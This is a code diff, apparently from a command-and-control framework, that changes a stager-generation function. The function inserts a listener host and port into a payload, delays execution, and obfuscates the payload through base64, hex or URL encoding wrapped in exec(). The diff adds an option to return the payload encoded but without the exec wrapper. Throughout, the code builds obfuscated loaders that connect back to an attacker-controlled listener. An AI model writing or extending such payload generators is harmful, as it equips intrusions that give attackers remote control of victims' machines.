@@ -23,7 +23,7 @@ def create_stager(name : str, listener_id: int) -> any:
     conn.commit()
     return "Created Stager successfully!"
 
-def get_stager(id: str, encoder: str = "base64", random_size : bool = False, timeout : int = 5000, format : str = "py", delay : int = 1) -> any:
+def get_stager(id: str, encoder: str = "base64", random_size : bool = False, timeout : int = 5000, format : str = "py", delay : int = 1, finished: bool = True) -> any:
     """
     Get Content of a Stager to download or copy
 
@@ -81,27 +81,41 @@ def get_stager(id: str, encoder: str = "base64", random_size : bool = False, tim
     
     # Replace the Payload
     finished_payload =  start + "\n"
-    finished_payload += f"import time\ntime.sleep({delay})\nHOST = '{address}'\nPORT = {port}\nTIMEOUT = {timeout}\nssl={ssl}\n"
+    finished_payload += f"import time\ntime.sleep({delay})\nHOST = '{address}'\nPORT = {port}\nTIMEOUT = {timeout}\nSSL={ssl}\n"
     finished_payload += payload + "\n" + end
 
     # Encode the Payload
-    if encoder == "base64":
-        finished_payload = """"import base64;exec(base64.b64decode(b'%s'))""" % base64.b64encode(
-            finished_payload.encode()).decode()
-    elif encoder == "hex":
-        finished_payload = """from binascii import unhexlify;exec(unhexlify('%s'))""" % hexlify(
-            finished_payload.encode()).decode()
-    elif encoder == "url":
-        finished_payload = """import urllib.parse;exec(urllib.parse.unquote('%s'))""" % urllib.parse.quote(
-            finished_payload)
-    elif encoder == "raw":
-        pass
+    if not finished:
+        if encoder == "base64":
+            finished_payload = base64.b64encode(finished_payload.encode()).decode()
+        elif encoder == "hex":
+            finished_payload = hexlify(finished_payload.encode()).decode()
+        elif encoder == "url":
+            finished_payload = urllib.parse.quote(finished_payload)
+        elif encoder == "raw":
+            pass
+        else:
+            raise Exception("Encoder not supported")
     else:
-        raise Exception("Encoder not supported")
+        if encoder == "base64":
+            finished_payload = """"import base64;exec(base64.b64decode(b'%s'))""" % base64.b64encode(
+                finished_payload.encode()).decode()
+        elif encoder == "hex":
+            finished_payload = """from binascii import unhexlify;exec(unhexlify('%s'))""" % hexlify(
+                finished_payload.encode()).decode()
+        elif encoder == "url":
+            finished_payload = """import urllib.parse;exec(urllib.parse.unquote('%s'))""" % urllib.parse.quote(
+                finished_payload)
+        elif encoder == "raw":
+            pass
+        else:
+            raise Exception("Encoder not supported")
     
     if format == "py":
         return finished_payload
     elif format == "exe":
+        if not finished:
+            raise Exception("Cannot create an exe from a non finished payload")
         # Create the EXE
         pass
     else:
